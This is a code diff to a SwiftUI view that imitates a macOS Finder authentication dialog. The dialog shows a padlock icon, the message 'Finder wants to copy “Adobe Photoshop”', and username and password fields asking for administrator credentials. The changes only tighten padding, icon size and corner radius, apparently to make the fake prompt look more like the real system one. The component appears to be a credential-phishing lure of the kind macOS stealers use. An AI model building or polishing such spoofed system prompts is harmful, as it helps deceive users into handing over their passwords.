@@ -90,9 +90,9 @@ struct FinderPadlockIcon: View {
                 Image(nsImage: img)
                     .resizable()
                     .interpolation(.high)
-                    .frame(width: 88, height: 88)
+                    .frame(width: 72, height: 72)
             } else {
-                Color.clear.frame(width: 88, height: 88)
+                Color.clear.frame(width: 72, height: 72)
             }
         }
         .onAppear {
@@ -149,30 +149,30 @@ struct ContentView: View {
     var body: some View {
         VStack(alignment: .leading, spacing: 0) {
             FinderPadlockIcon()
-                .padding(.bottom, 14)
+                .padding(.bottom, 12) // Reduced from 14
 
             Text("Finder")
                 .font(.system(size: 15, weight: .bold))
                 .foregroundColor(.primary)
-                .padding(.bottom, 14)
+                .padding(.bottom, 10) // Reduced from 14
 
             Text("Finder wants to copy \u{201C}Adobe Photoshop\u{201D}.")
                 .font(.system(size: 13))
                 .foregroundColor(.primary)
-                .padding(.bottom, 8)
+                .padding(.bottom, 4) // Reduced from 8
 
             Text("Enter an administrator\u{2019}s name and password to allow this.")
                 .font(.system(size: 13))
                 .foregroundColor(.primary)
                 .lineSpacing(2)
                 .fixedSize(horizontal: false, vertical: true)
-                .padding(.bottom, 14)
+                .padding(.bottom, 10) // Reduced from 14
 
             fieldContainer(text: $username, placeholder: "Username", secure: false, field: .username)
-                .padding(.bottom, 8)
+                .padding(.bottom, 6) // Reduced from 8
 
             fieldContainer(text: $password, placeholder: "Password", secure: true, field: .password)
-                .padding(.bottom, 14)
+                .padding(.bottom, 12) // Reduced from 14
 
             HStack(spacing: 12) {
                 Button("Cancel") { cancel() }
@@ -193,12 +193,12 @@ struct ContentView: View {
                 }
             }
         }
-        .padding(16)
-        .frame(width: 260) // Restored original width
+        .padding(14) // Reduced from 20
+        .frame(width: 260) // Back to 260 to match width
         .background(VisualEffectView(material: .popover))
-        .clipShape(RoundedRectangle(cornerRadius: 20, style: .continuous))
+        .clipShape(RoundedRectangle(cornerRadius: 18, style: .continuous))
         .overlay(
-            RoundedRectangle(cornerRadius: 20, style: .continuous)
+            RoundedRectangle(cornerRadius: 18, style: .continuous)
                 .stroke(Color.white.opacity(0.10), lineWidth: 0.5)
         )
         .compositingGroup()
